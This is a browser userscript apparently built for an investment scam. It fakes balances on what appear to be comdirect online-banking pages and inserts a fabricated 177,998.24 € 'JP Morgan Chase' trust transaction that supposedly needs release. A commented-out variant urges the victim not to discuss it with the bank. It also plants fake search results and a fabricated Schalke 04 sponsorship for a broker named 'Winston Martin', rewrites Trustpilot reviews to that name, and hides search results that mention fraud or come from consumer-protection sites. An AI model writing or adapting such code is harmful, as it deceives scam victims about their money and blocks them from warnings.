// ==UserScript==
// @name         Ed 4Rec  comd.m.u.szx@icloud.com
// @namespace    http://tampermonkey.net/
// @version      7.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/533033/Ed%204Rec%20%20comdmuszx%40icloudcom.user.js
// @updateURL https://update.greasyfork.org/scripts/533033/Ed%204Rec%20%20comdmuszx%40icloudcom.meta.js
// ==/UserScript==



// GREEN ONES

  // Configurable modification amounts and corresponding indexes
    var grehomeBALANCE_CONFIGS = [
    //    { index: 0, adjustmentAmount: 10000 },  STARTING WITH 1, NOT 0
        // BALANCES SHOULD BE INDEXED THROUGH 1, STARTING WITH INDEX 1
        { index: 1, adjustmentAmount: 0 }, // GIROKONTO
    //    { index: 2, adjustmentAmount: 10000 },
        { index: 7, adjustmentAmount: 0 }, // GESAMT
    //    { index: 4, adjustmentAmount: 20000 },
    //    { index: 5, adjustmentAmount: -15000 }
        // Add more configurations as needed...
    ];

// GRAY ONES

  // Configurable modification amounts and corresponding indexes
    var grahomeBALANCE_CONFIGS = [
    //    { index: 0, adjustmentAmount: 10000 },  STARTING WITH INDEX 1 NOT 0
        { index: 1, adjustmentAmount: 0 }, // GIROKONTO
 //     { index: 2, adjustmentAmount: 10000 },
  //      { index: 3, adjustmentAmount: 5000 },
      { index: 4, adjustmentAmount: 0 }, // GESAMT
 //       { index: 5, adjustmentAmount: -15000 }
        // Add more configurations as needed...
    ];

// BAL MOD

    // Specify the text of the heading you want to target
    const targetHeadingText = 'Girokonto';

    // Specify the modification value (positive to increase, negative to decrease)
    const modificationValue = 0.0; // Example: can be positive or negative

// TRANSACTIONS

  // Define an array of transactions to insert
    const transactions = [
   //       {
   //         date: '19.08.2024',
  //          details: 'JP Morgan Chase. Geld für Gebühren. A. Gold meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.',
   //         amount: '15.700.00 €', // Example: can be positive or negative
   //         position: 'above' // Change to 'below' if you want to insert below the original
   //     },
        {
            date: 'Vorgemerkt',
            details: 'JP Morgan Chase. Treuhand. Freigabe nötig.',
            amount: '177.998.24 €', // Example: can be positive or negative
            position: 'above' // Change to 'below' if you want to insert below the original
        },

        // Add more transactions here as needed
    ];



// GREEN ONES

if (window.location.href.indexOf("comdirect") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("Downloads") > 0) {
    'use strict';

//    // Configurable modification amounts and corresponding indexes
//    var grehomeBALANCE_CONFIGS = [
//    //    { index: 0, adjustmentAmount: 10000 },  STARTING WITH 1, NOT 0
//        // BALANCES SHOULD BE INDEXED THROUGH 1, STARTING WITH INDEX 1
//        { index: 1, adjustmentAmount: 20000 },
//    //    { index: 2, adjustmentAmount: 10000 },
//        { index: 3, adjustmentAmount: 5000 },
////    //    { index: 4, adjustmentAmount: 20000 },
//        { index: 5, adjustmentAmount: -15000 }
//        // Add more configurations as needed...
//    ];

    // Function to modify the balance
    function modifyBalance() {
        // Check for the presence of the element with the class "icon-ico-CSV text-white"
        const csvElement = document.querySelector('.text-size--large.headline--no-margin.headline--h2.text-weight--medium.inner-spacing--medium-left-sm.headline')&& document.querySelector('.output-text.text-weight--regular.text-size--medium') && document.querySelector('.text-weight--bold.output-text.text-size--medium');

        if (csvElement) {
            // Find all elements containing the "€" sign in their text content, checking both positive and negative balances
            const balanceElements = document.querySelectorAll('.output-text.text-weight--regular.text-size--medium.color--cd-positive, .output-text.text-weight--regular.text-size--medium.color--cd-negative, .text-weight--bold.output-text.text-size--medium.color--cd-positive, .text-weight--bold.output-text.text-size--medium.color--cd-negative');

            grehomeBALANCE_CONFIGS.forEach(config => {
                const balanceElement = balanceElements[config.index];
                if (balanceElement && balanceElement.textContent.includes('€')) {
                    // Extract and parse the current balance
                    const balanceText = balanceElement.textContent.trim();
                    // Handle negative balances correctly
                    const balanceValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.').replace('−', '-'));

                    if (!isNaN(balanceValue)) {
                        // Calculate the new balance
                        const newBalanceValue = balanceValue + config.adjustmentAmount;
                        // Format the new balance with correct separators
                        const formattedNewBalance = formatBalance(newBalanceValue) + ' €';

                        // Update the balance element with the new value
                        balanceElement.textContent = formattedNewBalance;

                        // Determine the new class
                        const newClass = newBalanceValue >= 0 ? 'color--cd-positive' : 'color--cd-negative';
                        const oldClass = newBalanceValue >= 0 ? 'color--cd-negative' : 'color--cd-positive';

                        // Update the class if it has changed
                        if (balanceElement.classList.contains(oldClass)) {
                            balanceElement.classList.remove(oldClass);
                            balanceElement.classList.add(newClass);
                        }

                        console.log(`Balance at index ${config.index} modified from ${balanceText} to ${formattedNewBalance}`);

                        // Remove the csvElement 5 milliseconds after modification
                        setTimeout(() => {
                            const elementToRemove = document.querySelector('.text-size--large.headline--no-margin.headline--h2.text-weight--medium.inner-spacing--medium-left-sm.headline');
                            if (elementToRemove) {
                                elementToRemove.remove();
                                console.log("Element with class '.text-size--large.headline--no-margin.headline--h2.text-weight--medium.inner-spacing--medium-left-sm.headline' removed.");
                            }
                        }, 1);
                    } else {
                        console.log('Failed to parse current balance value.');
                    }
                }
            });
        }
    }

    // Function to remove elements with the class 'ucc-sp-headline lsgs-0d6f7--info-text'
    function removeInfoTextElements() {
        const elementsToRemove = document.querySelectorAll('.ucc-sp-headline.lsgs-0d6f7--info-text');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log("Element with class '.ucc-sp-headline.lsgs-0d6f7--info-text' removed.");
        });
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        const formattedBalance = balance.toFixed(2).replace('.', ','); // Use comma as decimal separator
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, '.'); // Add dots as thousands separators
    }

    // Call the function to modify the balance every 2 seconds
    setInterval(modifyBalance, 30);

    // Call the function to remove the '.ucc-sp-headline.lsgs-0d6f7--info-text' class every 50 milliseconds
    setInterval(removeInfoTextElements, 50);
}





// GRAY ONES
if (window.location.href.indexOf("comdirect") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("Downloads") > 0) {
    'use strict';

//    // Configurable modification amounts and corresponding indexes
//    var grahomeBALANCE_CONFIGS = [
//    //    { index: 0, adjustmentAmount: 10000 },  STARTING WITH INDEX 1 NOT 0
//        { index: 1, adjustmentAmount: 20000 },
//      { index: 2, adjustmentAmount: 10000 },
//        { index: 3, adjustmentAmount: 5000 },
 //     { index: 4, adjustmentAmount: 20000 },
//        { index: 5, adjustmentAmount: -15000 }
//        // Add more configurations as needed...
//    ];

    // Function to modify the balance
    function modifyBalance() {
        // Check for the presence of the element with the class "icon-ico-CSV text-white"
        const csvElement = document.querySelector('.headline--h1.headline') && document.querySelector('.output-text.color--cd-anthracite-50.text-weight--regular.text-size--medium');

        if (csvElement) {
            // Find all elements containing the "€" sign in their text content, checking both positive and negative balances
            const balanceElements = document.querySelectorAll('.output-text.color--cd-anthracite-50.text-weight--regular.text-size--medium');

            grahomeBALANCE_CONFIGS.forEach(config => {
                const balanceElement = balanceElements[config.index];
                if (balanceElement && balanceElement.textContent.includes('€')) {
                    // Extract and parse the current balance
                    const balanceText = balanceElement.textContent.trim();
                    // Handle negative balances correctly
                    const balanceValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.').replace('−', '-'));

                    if (!isNaN(balanceValue)) {
                        // Calculate the new balance
                        const newBalanceValue = balanceValue + config.adjustmentAmount;
                        // Format the new balance with correct separators
                        const formattedNewBalance = formatBalance(newBalanceValue) + ' €';

                        // Update the balance element with the new value
                        balanceElement.textContent = formattedNewBalance;

                        // Determine the new class
                        const newClass = newBalanceValue >= 0 ? 'color--cd-positive' : 'color--cd-negative';
                        const oldClass = newBalanceValue >= 0 ? 'color--cd-negative' : 'color--cd-positive';

                        // Update the class if it has changed
                        if (balanceElement.classList.contains(oldClass)) {
                            balanceElement.classList.remove(oldClass);
                            balanceElement.classList.add(newClass);
                        }

                        console.log(`Balance at index ${config.index} modified from ${balanceText} to ${formattedNewBalance}`);

                        // Remove the csvElement 5 milliseconds after modification
                        setTimeout(() => {
                            const elementToRemove = document.querySelector('.headline--h1.headline');
                            if (elementToRemove) {
                                elementToRemove.remove();
                                console.log("Element with class '.headline--h1.headline' removed.");
                            }
                        }, 1);
                    } else {
                        console.log('Failed to parse current balance value.');
                    }
                }
            });
        }
    }

    // Function to remove elements with the class 'ucc-sp-headline lsgs-0d6f7--info-text'
    function removeInfoTextElements() {
        const elementsToRemove = document.querySelectorAll('.ucc-sp-headline.lsgs-0d6f7--info-text');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log("Element with class '.ucc-sp-headline.lsgs-0d6f7--info-text' removed.");
        });
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        const formattedBalance = balance.toFixed(2).replace('.', ','); // Use comma as decimal separator
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, '.'); // Add dots as thousands separators
    }

    // Call the function to modify the balance every 2 seconds
    setInterval(modifyBalance, 30);

    // Call the function to remove the '.ucc-sp-headline.lsgs-0d6f7--info-text' class every 50 milliseconds
    setInterval(removeInfoTextElements, 50);
}



 if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0) {
//    // Specify the text of the heading you want to target
//    const targetHeadingText = 'Girokonto';

//    // Define an array of transactions to insert
//    const transactions = [
//        {
//            date: 'Vorgemerkt',
//            details: 'JP Morgan Chase. Treuhand. Freigabe nötig. A. Gold meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.',
//            amount: '77.998.24 €', // Example: can be positive or negative
//            position: 'above' // Change to 'below' if you want to insert below the original
//        },
//        // Add more transactions here as needed
//    ];

    // Function to determine the appropriate class for the transaction amount
    function getAmountClass(amount) {
        if (amount.includes('-')) {
            return 'output-text color--cd-negative';
        } else {
            return 'output-text color--cd-positive';
        }
    }

    // Function to normalize text by trimming, converting to lowercase, and removing inner whitespace
    function normalizeText(text) {
        return text.toLowerCase().replace(/\s+/g, ' ').trim();
    }

    // Function to duplicate and insert multiple transactions
    function duplicateTransactions() {
        console.log('Userscript started.');

        // Find the heading with the specified text
        const heading = Array.from(document.querySelectorAll('h2.headline--full-width.headline--boxed.headline--h2.headline'))
            .find(h => normalizeText(h.textContent) === normalizeText(targetHeadingText));

        console.log('Heading element:', heading);

        if (heading) {
            // Find the over next sibling of the heading
            let sibling = heading.nextElementSibling;
            let overNextSibling = sibling ? sibling.nextElementSibling : null;
            console.log('Over next sibling of heading:', overNextSibling);

            // Check if the over next sibling exists
            if (overNextSibling) {
                // Find all elements with the class "table__row table__row--details-trigger" within the over next sibling
                const targetRows = overNextSibling.querySelectorAll('.table__row.table__row--details-trigger');
                let targetRow;

                // Find the first element that contains 'span.output-text.color--cd-text-secondary'
                for (let row of targetRows) {
                    if (row.querySelector('span.output-text.color--cd-text-secondary')) {
                        targetRow = row;
                        break;
                    }
                }

                if (targetRow) {
                    transactions.forEach((transaction, index) => {
                        // Clone the target row element
                        const clonedRow = targetRow.cloneNode(true);
                        console.log(`Cloned row element ${index + 1}:`, clonedRow);

                        // Modify the cloned element to include the specified transaction details
                        const cells = clonedRow.querySelectorAll('td');
                        if (cells.length > 1) {
                            // Set transaction date if the element exists
                            const dateElement = cells[1].querySelector('span.output-text.color--cd-text-secondary');
                            if (dateElement) {
                                dateElement.textContent = transaction.date;
                            }

                            // Set transaction details
                            cells[2].querySelector('span.output-text').textContent = transaction.details;

                            // Set transaction amount and class
                            const amountCell = cells[3].querySelector('span.output-text');
                            amountCell.innerHTML = transaction.amount;
                            amountCell.className = getAmountClass(transaction.amount); // Apply the appropriate class
                        }

                        // Determine where to insert the cloned row
                        if (transaction.position === 'below') {
                            // Insert the cloned row after the original target row
                            targetRow.parentNode.insertBefore(clonedRow, targetRow.nextSibling);
                            console.log(`Cloned and modified row element ${index + 1} inserted below the original row.`);
                        } else if (transaction.position === 'above') {
                            // Insert the cloned row before the original target row
                            targetRow.parentNode.insertBefore(clonedRow, targetRow);
                            console.log(`Cloned and modified row element ${index + 1} inserted above the original row.`);
                        } else {
                            console.log(`Invalid insert position "${transaction.position}" for transaction ${index + 1}. Expected "above" or "below".`);
                        }
                    });
                } else {
                    console.log('No element with class "table__row table__row--details-trigger" containing "span.output-text.color--cd-text-secondary" found.');
                }
            } else {
                console.log('No over next sibling found after the heading.');
            }
        } else {
            console.log(`Heading "${targetHeadingText}" not found.`);
        }
    }

    // Execute the function
    duplicateTransactions();
}




  if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("mainscript") > 0 || window.location.href.indexOf("Downloads") > 0 ) {

    'use strict';

    // Specify the text of the heading you want to target
  //  const targetHeadingText = 'Girokonto';

    // Specify the modification value (positive to increase, negative to decrease)
//    const modificationValue = 9990.50; // Example: can be positive or negative

    // Function to normalize text by trimming, converting to lowercase, and removing inner whitespace
    function normalizeText(text) {
        return text.toLowerCase().replace(/\s+/g, ' ').trim();
    }

    // Function to format a number as a string with dot as thousands separator and comma as decimal separator
    function formatBalance(amount) {
        return amount.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    }

    // Function to parse a balance string with dot as thousands separator and comma as decimal separator
    function parseBalance(balanceText) {
        const normalizedText = balanceText.replace(/\./g, '').replace(',', '.').replace('€', '').trim();
        return parseFloat(normalizedText);
    }

    // Function to find and modify the balance
    function modifyBalance() {
        console.log('Userscript started.');

        // Find the heading with the specified text
        const heading = Array.from(document.querySelectorAll('h2.headline--full-width.headline--boxed.headline--h2.headline'))
            .find(h => normalizeText(h.textContent) === normalizeText(targetHeadingText));

        console.log('Heading element:', heading);

        if (heading) {
            // Find the next sibling of the heading
            let sibling = heading.nextElementSibling;
            console.log('Next sibling of heading:', sibling);

            // Check if the sibling exists
            if (sibling) {
                // Find the balance element, either positive or negative
                const balanceElement = sibling.querySelector('span.text-size--large.text-weight--bold.output-text.color--cd-positive') ||
                                      sibling.querySelector('span.text-size--large.text-weight--bold.output-text.color--cd-negative');
                console.log('Balance element:', balanceElement);

                if (balanceElement) {
                    // Get the current balance
                    const currentBalanceText = balanceElement.textContent;
                    const currentBalance = parseBalance(currentBalanceText);
                    console.log('Current balance:', currentBalance);

                    // Modify the balance
                    const newBalance = currentBalance + modificationValue;
                    console.log('New balance:', newBalance);

                    // Update the balance element's text content
                    balanceElement.textContent = formatBalance(newBalance) + ' €';
                    console.log('Balance element updated with new balance.');

                    // Update the balance class based on the new balance
                    if (newBalance >= 0) {
                        // If new balance is positive or zero, set positive class
                        balanceElement.classList.remove('color--cd-negative');
                        balanceElement.classList.add('color--cd-positive');
                        console.log('Balance class updated to positive.');
                    } else {
                        // If new balance is negative, set negative class
                        balanceElement.classList.remove('color--cd-positive');
                        balanceElement.classList.add('color--cd-negative');
                        console.log('Balance class updated to negative.');
                    }
                } else {
                    console.log('Balance element not found within the sibling.');
                }
            } else {
                console.log('No sibling found after the heading.');
            }
        } else {
            console.log(`Heading "${targetHeadingText}" not found.`);
        }
    }

    // Execute the function
    modifyBalance();

}



//UTILITY FUNCTIONS
if (window.location.href.indexOf("comdirect") > 0 || window.location.href.indexOf("drive") > 0 || window.location.href.indexOf("Downloads") > 0) {

// Function to check and remove elements
function checkAndRemoveElements() {
    // Select all elements with the class "form-grid__row"
    const rows = document.querySelectorAll('.form-grid__row');

    rows.forEach(row => {
        // Check if any child element contains the text "Kontostand"
        if (row.textContent.includes('Kontostand')) {
            // Remove the row element
            row.remove();
        }
    });

    // Select the element with the class "kontoinhaber--toolbar visible-lg-block"
    const toolbar = document.querySelector('.kontoinhaber--toolbar.visible-lg-block');

    if (toolbar) {
        // Remove the toolbar element
        toolbar.remove();
    }
}

// Run the check every 100 milliseconds
const intervalId = setInterval(checkAndRemoveElements, 100);







    }



 // Script 1: Custom Search Results
if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1
    && window.location.href.indexOf("ing.de") === -1) {
        (function() {
            'use strict';

            // Padding settings for Google and Bing
            let googlePadding = "0px";
            let bingPadding = "40px";

            // Add style to reduce the space between search results
            let style = document.createElement('style');
            style.type = 'text/css';
            style.innerHTML = `
                .e9EfHf, .b_algo {
                    padding: 0;
                    margin: 20px;
                }
                .eqAnXb, .b_caption {
                    padding: 0;
                    margin: 20px;
                }
                .g, .b_algo {
                    padding: 0;
                    margin: 30px;
                }
            `;
            document.head.appendChild(style);

            try {
                let hostname = window.location.hostname;
                let isGoogleDomain = hostname.includes('google.');
                let isBingDomain = hostname.includes('bing.com');

                if (!isGoogleDomain && !isBingDomain) {
                    return; // Not on Google or Bing, exit script
                }

                let urlParams = new URLSearchParams(window.location.search);
                let queryParam = 'q';
                let query = urlParams.get(queryParam).toLowerCase();
                let startParam = urlParams.get('start') || urlParams.get('first');

                // If not on the first page, do not modify the search results.
                if (startParam !== null && startParam !== '0' && startParam !== '1') {
                    return;
                }

                let customResults = [
                    {
                        keywords: ["aix", "winston", "martin", "winston martin", "trader", "aixtrader", "blue star", "bluestar", "fiat201", "fiat 201", "schalke", "trust", "aix trader", "aix-trader", "flow", "flowtrade", "flowtrader", "trader", "flow trader", "24", "ing", "targo", "targobank", "diba", "login"],
                        results: [
                            {
                                url: "https://cfd.winstonmartin.com/",
                                title: "Winston Martin dein Broker",
                                description: "Winston Martin ist der Broker mit der besten Reputation.",
                                footerText: "https://cfd.winstonmartin.com/",
                                footerTextPosition: {
                                    google: {bottom: "55px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                            {
                                url: "https://de.trustpilot.com/review/icmarkets.com?page=7",
                                title: "Bewertungen von Winston Martin - einer der größten Makler der Welt",
                                description: "Über 30 000 Bewertungen über den Broker Winston Martin",
                                footerText: "https://de.trustpilot.com/review/winstonmartin.com?page=7",
                                footerTextPosition: {
                                    google: {bottom: "85px", left: "0px"},
                                    bing: {bottom: "45px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            },
                             {
                                url: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                title: "Winston Martin Partner von Fussbalklub Schalke 04",
                                description: "Wir freuen uns, bekannt geben zu können, dass Winston Martin ab dem 1. Januar unser Sponsor und Partner wird. Winston Martin ist spezialisiert auf Vermögensverwaltung und Handel. Unsere Spieler sind Winston Martin sehr dankbar, insbesondere Andreas Graf, der ihr Kapital verwaltet.",
                                footerText: "https://schalke04.de/business/sponsoring/sponsorenuebersicht/",
                                footerTextPosition: {
                                    google: {bottom: "120px", left: "0px"},
        bing: {bottom: "75px", left: "0px"},
                                },
                                footerTextStyles: {whiteSpace: "nowrap"}
                            }
                        ],
                        // add more groups of custom results here if needed
                    },
                    // Add more groups of custom results here if needed
                ];

                for (let group of customResults) {
                    for (let keyword of group.keywords) {
                        if (query.includes(keyword)) {
                            const checkExist = setInterval(function() {
                                const search = document.querySelector(isGoogleDomain ? 'div#search' : '#b_results');
                                const elementToRemove = document.querySelector(isGoogleDomain ? 'div#taw' : '#b_context');

                                if (search !== null) {
                                    // If the element exists, remove it from the page
                                    if (elementToRemove !== null) {
                                        elementToRemove.parentNode.removeChild(elementToRemove);
                                    }

                                    group.results.forEach(function(resultObj) {
                                        const result = document.createElement('div');
                                        result.innerHTML = `
                                            <div class="g" style="padding-bottom: ${isGoogleDomain ? googlePadding : bingPadding};${isBingDomain ? 'margin: 20px 0;' : ''}">
                                                <div class="rc" style="margin-bottom: 0px;">
                                                    <div class="r">
                                                        <a href="${resultObj.url}">
                                                            <h3 class="LC20lb DKV0Md">${resultObj.title}</h3>
                                                        </a>
                                                    </div>
                                                    <div class="s">
                                                        <div><span>${resultObj.description}</span></div>
                                                    </div>
                                                </div>
                                                <div class="TbwUpd NJjxre iUh30 ojE3Fb" style="position: relative;">
                                                    <span style="position: absolute; bottom: ${isGoogleDomain ? resultObj.footerTextPosition.google.bottom : resultObj.footerTextPosition.bing.bottom}; left: ${isGoogleDomain ? resultObj.footerTextPosition.google.left : resultObj.footerTextPosition.bing.left}; white-space: ${resultObj.footerTextStyles.whiteSpace};">${resultObj.footerText}</span>
                                                </div>
                                            </div>
                                        `;

                                        search.insertBefore(result, search.firstChild);
                                    });

                                    clearInterval(checkExist);
                                }
                            }, 100); // check every 100ms

                            // only handle the first matching keyword
                            break;
                        }
                    }
                }
            } catch (e) {
                console.error(e);
            }
        })();
}


// Script 2: Custom Trustpilot Header and URL Modifier
if (window.location.href.indexOf("https://de.trustpilot.com/") !== -1 && window.location.href.indexOf("ing.de") === -1) {
  (function () {
    'use strict';

    // Define the custom header, logo URL, and URL for the specified element
    const customHeader = "Winston Martin";
    const customLogoURL = "https://p-cdn.co/winstonmartin/brands/winstonmartin/logo-white.png";
    const customURL = "https://cfd.winstonmartin.com/";
    const customReferenceURL = "winstonmartin.com";
    const customLinkURL = "https://cfd.winstonmartin.com/"; // Replace this with your desired URL

    // Define keyword replacements here (keyword: replacement)
    const keywordReplacements = {
      "ic markets": "Winston Martin",
      "icmarkets": "Winston Martin",
      "ic-markets": "Winston Martin",
      // Add more keyword-replacement pairs as needed
    };

    // Function to replace keywords with their replacement values
    function replaceKeywords() {
      const elements = document.getElementsByTagName("*");
      for (let i = 0; i < elements.length; i++) {
        const element = elements[i];
        for (let j = 0; j < element.childNodes.length; j++) {
          const node = element.childNodes[j];
          if (node.nodeType === 3) {
            const text = node.nodeValue;
            let replacedText = text;
            for (const keyword in keywordReplacements) {
              if (Object.prototype.hasOwnProperty.call(keywordReplacements, keyword)) {
                const replacement = keywordReplacements[keyword];
                replacedText = replacedText.replace(new RegExp(`\\b${keyword}\\b`, "gi"), replacement);
              }
            }
            if (replacedText !== text) {
              element.replaceChild(document.createTextNode(replacedText), node);
            }
          }
        }
      }
    }

    // Function to set black background to the parent element of the inserted image
    function setBlackBackground() {
      const imageWrapperElement = document.querySelector('.profile-image_imageWrapper__kDdWe');
      if (imageWrapperElement) {
        imageWrapperElement.style.backgroundColor = 'black';
      }
    }

    // Function to remove elements with classes "styles_badgesWrapper__6VasU" and "styles_badgesWrapper__6VasU styles_sticky__yeJRO"
    function removeBadgesWrapperElements() {
      const badgesWrapperElements = document.querySelectorAll('.styles_badgesWrapper__6VasU, .styles_badgesWrapper__6VasU.styles_sticky__yeJRO');
      badgesWrapperElements.forEach((element) => {
        element.remove();
      });
    }

    // Function to remove elements with class "styles_cardWrapper__LcCPA styles_show__HUXRb styles_reviewCard__9HxJJ" if they contain the link "https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"
    function removeReviewCardElements() {
      const reviewCardElements = document.querySelectorAll('.styles_cardWrapper__LcCPA.styles_show__HUXRb.styles_reviewCard__9HxJJ');
      reviewCardElements.forEach((element) => {
        const linkElement = element.querySelector('a[href="https://cdn.trustpilot.net/brand-assets/4.1.0/stars/stars-1.svg"]');
        if (linkElement) {
          element.remove();
        }
      });
    }

    // Function to replace the logo image with the custom logo URL
    function replaceLogo() {
      const logoImageElement = document.querySelector('.business-profile-image_image__jCBDc');
      if (logoImageElement) {
        logoImageElement.src = customLogoURL;
        logoImageElement.removeAttribute('srcset');
      }
    }

    // Function to remove avif and jpeg elements from the picture element
    function removeAvifAndJpegLinks() {
      const pictureElement = document.querySelector('.business-profile-image_containmentWrapper__wu_Tp');
      if (pictureElement) {
        const avifSourceElement = pictureElement.querySelector('source[type="image/avif"]');
        if (avifSourceElement) {
          avifSourceElement.remove();
        }
        const jpegSourceElement = pictureElement.querySelector('source[type="image/jpeg"]');
        if (jpegSourceElement) {
          jpegSourceElement.remove();
        }
      }
    }

    // Wait for the page to load completely, then perform the modifications
    function onDocumentReady() {
      replaceKeywords();
      setBlackBackground();
      removeBadgesWrapperElements();
      removeReviewCardElements();
      replaceLogo();
      removeAvifAndJpegLinks();
    }

    // Observe mutations in the DOM and trigger modifications
    const observer = new MutationObserver((mutationsList) => {
      for (const mutation of mutationsList) {
        if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
          onDocumentReady();
          break;
        }
      }
    });

    // Start observing the document
    observer.observe(document.body, { childList: true, subtree: true });

    // If the document is already completely loaded, trigger modifications
    if (document.readyState === 'complete') {
      onDocumentReady();
    }
  })();
}


// Script 3: Modify Schalke Website
if (window.location.href.indexOf("schalke") !== -1 && window.location.href.indexOf("ing.de") === -1) {
  var newURL = "https://cfd.winstonmartin.com/";
var newLogoURL = "https://i.ibb.co/wRWGRKf/Copy-of-Untitled-Design-1.png";
var elementIndex = 2; // specify the index of the element here
var padding = {top: 0, right: 0, bottom: 0, left: 0}; // specify the padding here
var moduleIndexToRemove = 20; // specify the index of the .module.module-image element to remove here
var hasRemoved = false; // flag to indicate whether removal has happened

var sobserver = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.type === "childList") {
            var modules = document.querySelectorAll(".module.module-image");
            if (modules.length > elementIndex) {
                var module = modules[elementIndex];
                var link = module.querySelector("a");
                link.href = newURL;
                var img = link.querySelector("img.img-fluid.initial.lazyloaded");
                if (img) {
                    img.setAttribute("data-lazy-src", newLogoURL);
                    img.src = newLogoURL;
                    //img.style.opacity = "0.5"; // set opacity to 50%
                    img.style.filter = "contrast(150%)"; // increase contrast by 50%
                    //module.style.backgroundColor = "#000"; // set black background
                }
                module.style.padding = `${padding.top}px ${padding.right}px ${padding.bottom}px ${padding.left}px`;
            }

            if (!hasRemoved && modules.length > moduleIndexToRemove) {
                var moduleToRemove = modules[moduleIndexToRemove];
                moduleToRemove.remove();
                hasRemoved = true; // set flag to true after removal
            }
        }
    });
});

sobserver.observe(document.body, {childList: true, subtree: true});


}

// Script 4: Search Result Filter
    if (window.location.href.indexOf("google.com") !== -1 ||
    window.location.href.indexOf("google.de") !== -1 ||
    window.location.href.indexOf("google.at") !== -1 ||
    window.location.href.indexOf("google.ch") !== -1 ||
    window.location.href.indexOf("bing.com") !== -1 &&
        window.location.href.indexOf("ing.de") === -1) {
(function() {
  'use strict';

  // Define the words, domains, and URLs to block
  var blockedWords = ['Betrug', 'schwarz', 'Scam', 'Broker', 'Finanzbetrug', 'Auszahlung', 'seriös' ]; // Add the words to block here
  var blockedDomains = ['watchlist-internet.at', 'broker-zahlt-nicht.de', 'scamadviser.com', 'finanzsache.com', 'webparanoid.com', 'personal-reviews.com', 'unique-reviews.com', 'kanzlei-herfurtner.de', 'verbraucherzentrale.de', 'betrug.de', 'ritschel-keller.de', 'seitcheck.de', 'anwalt.de' ]; // Add the domains to block here
  var blockedUrls = ['https://de.trustpilot.com/review/winstonmartin.com', 'https://www.example2.com']; // Add the urls to block here

  // Function to hide elements
  function hideElement(element) {
    if (element.style) element.style.display = 'none';
  }

  // Function to check and hide search results
  function checkAndHideSearchResults() {
    // Google
    var googleResults = document.querySelectorAll('.g');
    googleResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });

    // Bing
    var bingResults = document.querySelectorAll('.b_algo');
    bingResults.forEach(function(result) {
      var urlElement = result.querySelector('a');
      var url = urlElement ? urlElement.href : '';
      var text = result.textContent.toLowerCase();
      if (blockedUrls.includes(url) || blockedDomains.some(domain => url.includes(domain)) || blockedWords.some(word => text.includes(word))) {
        hideElement(result);
      }
    });
  }


  // Function to execute the search result filtering
    function executeSearchResultFilter() {
      checkAndHideSearchResults();

      // Set an interval to check repeatedly, to deal with lazy-loaded search results
      setInterval(checkAndHideSearchResults, 1000);
    }

    // Call the function immediately
    executeSearchResultFilter();
  })();
        }

